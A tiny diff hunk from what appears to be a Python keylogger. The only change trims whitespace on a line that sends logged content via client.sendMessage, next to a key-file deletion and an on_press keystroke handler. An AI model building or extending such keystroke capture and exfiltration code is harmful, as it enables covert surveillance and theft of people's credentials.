@@ -42,7 +42,7 @@ def writeToFile(key):
 
 		os.remove(KEY_FILE)
 
-		client.sendMessage(content) 
+		client.sendMessage(content)
 
 
 def on_press(key):
